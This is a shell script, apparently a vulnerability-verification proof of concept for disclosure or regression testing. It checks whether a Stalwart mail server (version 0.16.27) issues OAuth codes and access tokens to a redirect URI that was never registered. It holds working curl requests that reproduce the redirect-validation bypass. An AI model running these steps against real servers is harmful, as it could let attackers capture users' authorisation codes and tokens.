#!/bin/sh
# F1: registered OAuth client's redirectUris are not enforced (default requireClientRegistration=false).
# Expected on fixed build: step 2 refused. Observed on 0.16.27: code issued and exchanged for a token.
. "$(dirname "$0")/env.sh"; set -u
CID="demo-$(date +%s)"
echo "1) admin registers public client $CID with redirectUris={https://good.example/cb}"
curl -s -u "$SW_ADMIN" -X POST "$SW_HOST/jmap" -H 'content-type: application/json' -d "{\"using\":[\"urn:ietf:params:jmap:core\",\"urn:stalwart:jmap\"],\"methodCalls\":[[\"x:OAuthClient/set\",{\"accountId\":\"$SW_ADMIN_ACCOUNT_ID\",\"create\":{\"o\":{\"clientId\":\"$CID\",\"redirectUris\":{\"https://good.example/cb\":true}}}},\"c0\"]]}" | grep -o '"created":{[^}]*}}' || echo "(create failed)"
echo "2) user logs in for $CID with UNREGISTERED redirectUri https://not-registered.example/cb"
R=$(curl -s -X POST "$SW_HOST/api/auth" -H 'content-type: application/json' -d "{\"type\":\"authCode\",\"accountName\":\"$SW_USER_NAME\",\"accountSecret\":\"${SW_USER#*:}\",\"clientId\":\"$CID\",\"redirectUri\":\"https://not-registered.example/cb\"}")
echo "   response: $R"
CODE=$(printf '%s' "$R" | sed -n 's/.*"client_code":"\([^"]*\)".*/\1/p')
[ -z "$CODE" ] && { echo "RESULT: refused (fixed)"; exit 0; }
echo "3) exchange code at /auth/token with the unregistered redirect_uri"
T=$(curl -s -X POST "$SW_HOST/auth/token" -d "grant_type=authorization_code&code=$CODE&client_id=$CID&redirect_uri=https%3A%2F%2Fnot-registered.example%2Fcb")
echo "   response: $(printf '%s' "$T" | cut -c1-120)..."
printf '%s' "$T" | grep -q access_token && echo "RESULT: VULNERABLE - token issued to unregistered redirect_uri" || echo "RESULT: refused (fixed)"
